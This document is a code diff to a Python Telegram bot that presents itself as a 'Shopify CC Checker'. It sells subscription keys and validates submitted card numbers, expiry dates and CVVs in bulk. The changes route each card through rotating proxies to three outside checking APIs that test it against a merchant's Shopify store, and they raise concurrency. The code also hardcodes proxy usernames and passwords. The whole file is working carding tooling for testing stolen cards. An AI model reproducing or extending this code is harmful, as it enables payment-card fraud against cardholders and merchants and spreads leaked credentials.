@@ -12,13 +12,11 @@ from urllib.parse import quote
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import threading
 
-# Enable logging
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# Render Dummy HTTP Server (Keep Alive)
 class SimpleHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -28,17 +26,14 @@ class SimpleHandler(BaseHTTPRequestHandler):
 def run_server():
     port = int(os.environ.get("PORT", 10000))
     server = HTTPServer(("0.0.0.0", port), SimpleHandler)
-    logger.info(f"Dummy HTTP server started on port {port}")
     server.serve_forever()
 
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 OWNER_USERNAME = "@ESCROW2929"
-AUTHORIZED_ADMINS = {8785590284}  # Main Owner ID
+AUTHORIZED_ADMINS = {8785590284}
 DATA_FILE = "users_data.json"
-
 BOT_IS_STOPPED = False
 
-# Saare Proxies jo aapne mange hain
 PROXY_LIST = [
     "reseller3270s320237:7Grp9Gki@px052001.pointtoserver.com:10780",
     "reseller3270s320237:7Grp9Gki@px051003.pointtoserver.com:10780",
@@ -57,7 +52,6 @@ PROXY_LIST = [
     "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080"
 ]
 
-# Data Loading with Error Handling
 def load_data():
     if os.path.exists(DATA_FILE):
         try:
@@ -70,11 +64,10 @@ def load_data():
                     data.get("active_keys", {}),
                     {int(k): v for k, v in data.get("user_subscriptions", {}).items()}
                 )
-        except Exception as e:
-            logger.error(f"Error loading data: {e}")
+        except Exception:
+            pass
     return set(), set(), set(), {}, {}
 
-# Data Saving Function (Called automatically on every change)
 def save_data():
     data = {
         "all_users": list(ALL_USERS),
@@ -86,8 +79,8 @@ def save_data():
     try:
         with open(DATA_FILE, "w") as f:
             json.dump(data, f, indent=4)
-    except Exception as e:
-        logger.error(f"Error saving data: {e}")
+    except Exception:
+        pass
 
 ALL_USERS, BANNED_USERS, SUB_ADMINS, ACTIVE_KEYS, USER_SUBSCRIPTIONS = load_data()
 
@@ -101,261 +94,114 @@ def parse_time_to_seconds(time_str):
     time_str = time_str.lower().strip()
     try:
         if 'd' in time_str:
-            days = int(time_str.replace('d', ''))
-            return days * 86400
-        elif 'hour' in time_str or 'h' in time_str:
-            hours = int(time_str.replace('hour', '').replace('h', '').strip())
-            return hours * 3600
+            return int(time_str.replace('d', '')) * 86400
+        elif 'h' in time_str:
+            return int(time_str.replace('h', '').strip()) * 3600
         elif 'm' in time_str:
-            mins = int(time_str.replace('m', '').strip())
-            return mins * 60
+            return int(time_str.replace('m', '').strip()) * 60
     except ValueError:
         pass
     return 86400
 
 async def check_bot_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
     global BOT_IS_STOPPED
-    if BOT_IS_STOPPED:
-        user_id = update.effective_user.id
-        if not is_main_admin(user_id):
-            await update.message.reply_text("⛔ **Bot is currently offline/stopped by the Owner!**")
-            return False
+    if BOT_IS_STOPPED and not is_main_admin(update.effective_user.id):
+        await update.message.reply_text("⛔ **Bot is currently offline by Owner!**")
+        return False
     return True
 
-# Commands
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await check_bot_status(update, context):
-        return
-    user_id = update.effective_user.id
-    if user_id in BANNED_USERS:
-        await update.message.reply_text("⛔ You are banned from using this bot.")
-        return
-    ALL_USERS.add(user_id)
-    save_data()
-    user = update.effective_user
-    await update.message.reply_text(
-        f"Hello {user.first_name}!\n\n"
-        f"🤖 Shopify CC Checker Bot is Online (Dual-API Active)\n"
-        f"⚠️ Use /redeem <key> to activate access.\n"
-        f"👑 Owner: {OWNER_USERNAME}"
-    )
-
-async def stop_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_any_admin(user_id):
-        return
-    global BOT_IS_STOPPED
-    BOT_IS_STOPPED = True
-    await update.message.reply_text("🛑 **BOT STOPPED SUCCESSFULLY!**")
-
-async def start_all_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_any_admin(user_id):
-        return
-    global BOT_IS_STOPPED
-    BOT_IS_STOPPED = False
-    await update.message.reply_text("🟢 **BOT RESUMED & STARTED SUCCESSFULLY!**")
-
-async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await check_bot_status(update, context):
-        return
-    user_id = update.effective_user.id
-    if not is_any_admin(user_id):
-        return
-    panel_message = (
-        f"🛠 **Admin Panel & Controls**\n\n"
-        f"• Bot Status: {'🔴 Stopped' if BOT_IS_STOPPED else '🟢 Running'}\n"
-        f"• Total Users: {len(ALL_USERS)}\n"
-        f"• Banned Users: {len(BANNED_USERS)}\n"
-        f"• Sub Admins: {len(SUB_ADMINS)}\n"
-        f"• Active Keys: {len(ACTIVE_KEYS)}\n\n"
-        f"⚙️ **Admin Commands:**\n"
-        f"• `/key <qty> <time>` - Generate Keys (e.g. /key 5 1d)\n"
-        f"• `/listkeys` - View Active Keys & Time Left\n"
-        f"• `/makeadmin <user_id>` - Make Sub-Admin (Owner Only)\n"
-        f"• `/removeadmin <user_id>` - Remove Sub-Admin (Owner Only)\n"
-        f"• `/ban <user_id>` - Ban User\n"
-        f"• `/unban <user_id>` - Unban User\n"
-        f"• `/keyreset` - Reset All Keys & Subs\n"
-        f"• `/stop` & `/startall` - Control Bot Status"
-    )
-    await update.message.reply_text(panel_message, parse_mode="Markdown")
-
-async def make_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_main_admin(update.effective_user.id):
-        await update.message.reply_text("❌ Only Main Owner can make admins!")
-        return
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /makeadmin <user_id>")
-        return
-    try:
-        new_admin_id = int(context.args[0])
-        SUB_ADMINS.add(new_admin_id)
-        save_data()
-        await update.message.reply_text(f"✅ User `{new_admin_id}` is now a Sub-Admin!", parse_mode="Markdown")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid User ID format.")
-
-async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_main_admin(update.effective_user.id):
-        await update.message.reply_text("❌ Only Main Owner can remove admins!")
-        return
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /removeadmin <user_id>")
-        return
-    try:
-        rem_admin_id = int(context.args[0])
-        if rem_admin_id in SUB_ADMINS:
-            SUB_ADMINS.remove(rem_admin_id)
-            save_data()
-            await update.message.reply_text(f"✅ User `{rem_admin_id}` removed from Sub-Admins.", parse_mode="Markdown")
-        else:
-            await update.message.reply_text("❌ This user is not in Sub-Admins list.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid User ID format.")
-
-async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_any_admin(update.effective_user.id):
-        return
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /ban <user_id>")
-        return
-    try:
-        b_id = int(context.args[0])
-        BANNED_USERS.add(b_id)
-        if b_id in USER_SUBSCRIPTIONS:
-            del USER_SUBSCRIPTIONS[b_id]
-        save_data()
-        await update.message.reply_text(f"🔨 User `{b_id}` has been banned from the bot.", parse_mode="Markdown")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid User ID.")
-
-async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_any_admin(update.effective_user.id):
-        return
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /unban <user_id>")
-        return
-    try:
-        u_id = int(context.args[0])
-        if u_id in BANNED_USERS:
-            BANNED_USERS.remove(u_id)
-            save_data()
-            await update.message.reply_text(f"🔓 User `{u_id}` has been unbanned.", parse_mode="Markdown")
-        else:
-            await update.message.reply_text("❌ User is not in ban list.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid User ID.")
-
-async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await check_bot_status(update, context):
-        return
-    user_id = update.effective_user.id
-    if not is_any_admin(user_id):
-        return
-    if len(context.args) < 2:
-        await update.message.reply_text("❌ Usage: /key <qty> <time>")
-        return
-    try:
-        qty = int(context.args[0])
-    except ValueError:
-        return
-    duration_secs = parse_time_to_seconds(context.args[1])
-    keys = []
-    for _ in range(qty):
-        k = f"PRIME-{uuid.uuid4().hex[:8].upper()}"
-        ACTIVE_KEYS[k] = {"duration_seconds": duration_secs, "used_by": None, "expiry_time": None}
-        keys.append(k)
-    save_data()
-    await update.message.reply_text(f"🔑 {qty} Keys Generated:\n" + "\n".join([f"`{x}`" for x in keys]), parse_mode="Markdown")
-
-async def list_active_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await check_bot_status(update, context):
-        return
-    user_id = update.effective_user.id
-    if not is_any_admin(user_id):
-        return
-    
-    if not ACTIVE_KEYS:
-        await update.message.reply_text("📂 No keys generated yet.")
-        return
-    
-    current_time = time.time()
-    response_msg = "🔑 **Active & Generated Keys List:**\n\n"
-    
-    for key, data in ACTIVE_KEYS.items():
-        used_by = data.get("used_by")
-        expiry_time = data.get("expiry_time")
-        
-        if used_by is None:
-            status = "🟢 Unused"
-        elif expiry_time and current_time < expiry_time:
-            time_left = int(expiry_time - current_time)
-            hours = time_left // 3600
-            mins = (time_left % 3600) // 60
-            status = f"⏳ Active (Left: {hours}h {mins}m)"
-        else:
-            status = "🔴 Expired"
-            
-        response_msg += f"`{key}` ➔ {status}\n"
-    
-    if len(response_msg) > 4000:
-        response_msg = response_msg[:4000] + "\n\n[Truncated]"
-        
-    await update.message.reply_text(response_msg, parse_mode="Markdown")
-
-async def key_reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await check_bot_status(update, context):
-        return
-    if not is_any_admin(update.effective_user.id):
-        return
-    ACTIVE_KEYS.clear()
-    USER_SUBSCRIPTIONS.clear()
-    save_data()
-    await update.message.reply_text("✅ All keys and subscriptions reset.")
-
-async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
     user = update.effective_user
     if user.id in BANNED_USERS:
-        await update.message.reply_text("⛔ You are banned.")
         return
     ALL_USERS.add(user.id)
-    
-    if user.id in USER_SUBSCRIPTIONS:
-        if time.time() < USER_SUBSCRIPTIONS[user.id]:
-            time_left = int(USER_SUBSCRIPTIONS[user.id] - time.time())
-            hrs = time_left // 3600
-            mins = (time_left % 3600) // 60
-            await update.message.reply_text(f"❌ You already have an active subscription!\n⏳ Time Left: {hrs} hours {mins} minutes.")
-            return
-        else:
-            del USER_SUBSCRIPTIONS[user.id]
-            save_data()
+    save_data()
+    await update.message.reply_text(f"Hello {user.first_name}!\n🤖 3-API & Multi-Proxy Bot Online.\nUse /redeem <key>.")
 
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /redeem <key>")
+async def stop_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if is_any_admin(update.effective_user.id):
+        global BOT_IS_STOPPED
+        BOT_IS_STOPPED = True
+        await update.message.reply_text("🛑 Bot Stopped.")
+
+async def start_all_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if is_any_admin(update.effective_user.id):
+        global BOT_IS_STOPPED
+        BOT_IS_STOPPED = False
+        await update.message.reply_text("🟢 Bot Started.")
+
+async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if is_any_admin(update.effective_user.id):
+        await update.message.reply_text(f"🛠 **Admin Panel**\nUsers: {len(ALL_USERS)}\nBanned: {len(BANNED_USERS)}\nKeys: {len(ACTIVE_KEYS)}")
+
+async def make_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if is_main_admin(update.effective_user.id) and context.args:
+        SUB_ADMINS.add(int(context.args[0]))
+        save_data()
+        await update.message.reply_text("✅ Sub-Admin added.")
+
+async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if is_main_admin(update.effective_user.id) and context.args:
+        SUB_ADMINS.discard(int(context.args[0]))
+        save_data()
+        await update.message.reply_text("✅ Sub-Admin removed.")
+
+async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if is_any_admin(update.effective_user.id) and context.args:
+        b_id = int(context.args[0])
+        BANNED_USERS.add(b_id)
+        USER_SUBSCRIPTIONS.pop(b_id, None)
+        save_data()
+        await update.message.reply_text(f"🔨 User {b_id} banned.")
+
+async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if is_any_admin(update.effective_user.id) and context.args:
+        u_id = int(context.args[0])
+        BANNED_USERS.discard(u_id)
+        save_data()
+        await update.message.reply_text(f"🔓 User {u_id} unbanned.")
+
+async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_any_admin(update.effective_user.id) or len(context.args) < 2:
         return
-        
-    k = context.args[0].strip().upper()
-    
+    qty = int(context.args[0])
+    dur = parse_time_to_seconds(context.args[1])
+    keys = []
+    for _ in range(qty):
+        k = f"PRIME-{uuid.uuid4().hex[:8].upper()}"
+        ACTIVE_KEYS[k] = {"duration_seconds": dur, "used_by": None, "expiry_time": None}
+        keys.append(k)
+    save_data()
+    await update.message.reply_text("🔑 Generated:\n" + "\n".join([f"`{x}`" for x in keys]), parse_mode="Markdown")
+
+async def list_active_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_any_admin(update.effective_user.id):
+        return
+    msg = "\n".join([f"`{k}` - {'Used' if v['used_by'] else 'Unused'}" for k, v in ACTIVE_KEYS.items()]) or "No keys."
+    await update.message.reply_text(msg[:4000], parse_mode="Markdown")
+
+async def key_reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if is_any_admin(update.effective_user.id):
+        ACTIVE_KEYS.clear()
+        USER_SUBSCRIPTIONS.clear()
+        save_data()
+        await update.message.reply_text("✅ Reset done.")
+
+async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if user.id in BANNED_USERS or not context.args:
+        return
+    k = context.args[0].upper()
     if k not in ACTIVE_KEYS or ACTIVE_KEYS[k]["used_by"] is not None:
-        await update.message.reply_text("❌ Invalid or already used key!")
+        await update.message.reply_text("❌ Invalid/Used Key.")
         return
-        
     ACTIVE_KEYS[k]["used_by"] = user.id
     ACTIVE_KEYS[k]["expiry_time"] = time.time() + ACTIVE_KEYS[k]["duration_seconds"]
     USER_SUBSCRIPTIONS[user.id] = ACTIVE_KEYS[k]["expiry_time"]
     save_data()
-    
-    for admin_id in AUTHORIZED_ADMINS:
-        try:
-            await context.bot.send_message(chat_id=admin_id, text=f"🔑 Key Redeemed by {user.full_name} (`{user.id}`) using `{k}`")
-        except Exception:
-            pass
-            
-    await update.message.reply_text("✅ Key Successfully Redeemed! Your subscription is now active.")
+    await update.message.reply_text("✅ Sub Active!")
 
 def has_access(user_id):
     if is_any_admin(user_id):
@@ -363,24 +209,22 @@ def has_access(user_id):
     if user_id in USER_SUBSCRIPTIONS:
         if time.time() < USER_SUBSCRIPTIONS[user_id]:
             return True
-        else:
-            del USER_SUBSCRIPTIONS[user_id]
-            save_data()
-            return False
+        del USER_SUBSCRIPTIONS[user_id]
+        save_data()
     return False
 
 async def get_bin_info(bin_code):
     try:
-        async with httpx.AsyncClient(timeout=10.0) as client:
+        async with httpx.AsyncClient(timeout=4.0) as client:
             res = await client.get(f"https://lookup.binlist.net/{bin_code}")
             if res.status_code == 200:
-                data = res.json()
-                return f"{data.get('scheme', 'UNKNOWN').upper()} - {data.get('type', 'UNKNOWN').upper()}", data.get("bank", {}).get("name", "UNKNOWN").upper(), f"{data.get('country', {}).get('name', 'UNKNOWN').upper()} {data.get('country', {}).get('emoji', '')}"
+                d = res.json()
+                return f"{d.get('scheme','?').upper()} - {d.get('type','?').upper()}", d.get("bank", {}).get("name", "?").upper(), d.get("country", {}).get("name", "?").upper()
     except Exception:
         pass
-    return "UNKNOWN - UNKNOWN", "UNKNOWN", "UNKNOWN"
+    return "UNKNOWN", "UNKNOWN", "UNKNOWN"
 
-# Dual-API Fallback Card Processor
+# Ultimate 3-API & 3-Proxy Fallback Processor Function
 async def process_card_string(card_line, user_full_name):
     try:
         parts = card_line.split('|')
@@ -389,20 +233,18 @@ async def process_card_string(card_line, user_full_name):
         
         cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
         formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
-        bin_code = cc[:6]
-        
-        bin_info, bank_info, country_info = await get_bin_info(bin_code)
+        bin_info, bank_info, country_info = await get_bin_info(cc[:6])
         
         site_url = "https://ripnroll.com"
-        selected_proxy = random.choice(PROXY_LIST)
         
-        # Primary API & Secondary Railway API URLs
-        api_url_1 = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
-        api_url_2 = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxy)}"
+        # Pick 3 non-repeating proxies for the 3 distinct APIs
+        selected_proxies = random.sample(PROXY_LIST, min(3, len(PROXY_LIST)))
         
         res_data = None
-        async with httpx.AsyncClient(timeout=120.0, follow_redirects=True) as client:
-            # --- Try Primary API ---
+        async with httpx.AsyncClient(timeout=25.0, follow_redirects=True) as client:
+            
+            # --- API 1: rhaenyra.xyz ---
+            api_url_1 = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[0])}"
             try:
                 response = await client.get(api_url_1)
                 if response.status_code == 200:
@@ -410,8 +252,9 @@ async def process_card_string(card_line, user_full_name):
             except Exception:
                 pass
             
-            # --- Fallback to Secondary Railway API ---
-            if not res_data:
+            # --- API 2: Railway App ---
+            if not res_data or str(res_data.get("Approved", "False")).lower() != "true":
+                api_url_2 = f"https://web-production-c2d03.up.railway.app/shopify?site={quote(site_url)}&cc={quote(formatted_cc)}&proxy={quote(selected_proxies[1])}"
                 try:
                     response = await client.get(api_url_2)
                     if response.status_code == 200:
@@ -419,8 +262,18 @@ async def process_card_string(card_line, user_full_name):
                 except Exception:
                     pass
 
+            # --- API 3: Custom IP API (Aapki di gayi API format) ---
+            if not res_data or str(res_data.get("Approved", "False")).lower() != "true":
+                api_url_3 = f"http://216.250.119.63/?{quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[2])}"
+                try:
+                    response = await client.get(api_url_3)
+                    if response.status_code == 200:
+                        res_data = response.json()
+                except Exception:
+                    pass
+
         if not res_data:
-            return f"❌ {card_line} ➔ Both APIs failed or timed out (502 / Offline)."
+            return f"❌ {card_line} ➔ All 3 APIs & Proxies failed/timed out."
         
         resp_status = res_data.get("Response", "UNKNOWN")
         price = res_data.get("Price", "$14.97")
@@ -444,31 +297,25 @@ async def process_card_string(card_line, user_full_name):
             f"━━━━━━━━━━━━━━━━━\n"
             f"👤 Checked By ➠ {user_full_name}"
         )
-    except Exception as err:
-        logger.error(f"Error caught safely for line {card_line}: {str(err)}")
-        return f"❌ {card_line} ➔ Skipped due to internal parsing exception."
+    except Exception:
+        return f"❌ {card_line} ➔ Error occurred."
 
-card_semaphore = asyncio.Semaphore(2)
+card_semaphore = asyncio.Semaphore(5)
 
 async def safe_process_card(card_line, user_full_name):
     async with card_semaphore:
-        try:
-            return await process_card_string(card_line, user_full_name)
-        except Exception as e:
-            return f"❌ {card_line} ➔ Error: {str(e)}"
+        return await process_card_string(card_line, user_full_name)
 
-# Checker Handlers
 async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_bot_status(update, context):
         return
     user_id = update.effective_user.id
     if user_id in BANNED_USERS or not has_access(user_id):
-        await update.message.reply_text("⛔ **Access Denied!** You need an active subscription. Use `/redeem <key>`.")
+        await update.message.reply_text("⛔ Access Denied! Use `/redeem <key>`.")
         return
     if not context.args:
-        await update.message.reply_text("❌ Usage: /chk CC|MM|YY|CVV")
         return
-    msg = await update.message.reply_text("⏳ Processing card...")
+    msg = await update.message.reply_text("⏳ Processing with 3 APIs & 3 Proxies...")
     result = await process_card_string(" ".join(context.args), update.effective_user.first_name)
     await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=result)
 
@@ -477,7 +324,7 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     user_id = update.effective_user.id
     if user_id in BANNED_USERS or not has_access(user_id):
-        await update.message.reply_text("⛔ **Access Denied!** You need an active subscription. Use `/redeem <key>`.")
+        await update.message.reply_text("⛔ Access Denied! Use `/redeem <key>`.")
         return
     
     cards_text = update.message.text.replace("/chks", "").strip()
@@ -487,14 +334,11 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not card_lines:
         return
 
-    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards safely...")
+    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards across 3 APIs...")
     tasks = [safe_process_card(line, update.effective_user.first_name) for line in card_lines]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
+    results = await asyncio.gather(*tasks)
     
-    final_output = "\n\n".join([str(r) for r in results])
-    if len(final_output) > 4000:
-        final_output = final_output[:4000] + "\n\n[Truncated]"
-    
+    final_output = "\n\n".join(results)[:4000]
     try:
         await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=status_msg.message_id, text=final_output)
     except Exception:
@@ -505,37 +349,32 @@ async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     user_id = update.effective_user.id
     if user_id in BANNED_USERS or not has_access(user_id):
-        await update.message.reply_text("⛔ **Access Denied!** You need an active subscription. Use `/redeem <key>`.")
+        await update.message.reply_text("⛔ Access Denied! Use `/redeem <key>`.")
         return
     document = update.message.document
     if not document:
         return
     
-    status_msg = await update.message.reply_text("⏳ Processing file...")
+    status_msg = await update.message.reply_text("⏳ Processing file via 3 APIs...")
     try:
         file = await context.bot.get_file(document.file_id)
         file_bytes = await file.download_as_bytearray()
         card_lines = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").split("\n") if l.strip() and "|" in l][:10]
         
         tasks = [safe_process_card(line, update.effective_user.first_name) for line in card_lines]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
+        results = await asyncio.gather(*tasks)
         
-        final_output = "\n\n".join([str(r) for r in results])[:4000]
+        final_output = "\n\n".join(results)[:4000]
         await context.bot.send_message(chat_id=update.effective_chat.id, text=final_output)
-    except Exception as e:
-        logger.error(f"File error: {e}")
+    except Exception:
+        pass
 
 def main():
     if not TOKEN:
-        logger.error("Telegram Bot Token is missing!")
         return
-    
-    # Start web server for Render keep-alive
     threading.Thread(target=run_server, daemon=True).start()
+    app = ApplicationBuilder().token(TOKEN).concurrent_updates(True).build()
     
-    app = ApplicationBuilder().token(TOKEN).build()
-    
-    # Registering all commands
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stop", stop_bot))
     app.add_handler(CommandHandler("startall", start_all_bot))
@@ -554,7 +393,6 @@ def main():
     app.add_handler(CommandHandler("chf", chf_file_check))
     app.add_handler(MessageHandler(filters.Document.ALL, chf_file_check))
     
-    logger.info("Bot is starting polling...")
     app.run_polling()
 
 if __name__ == "__main__":
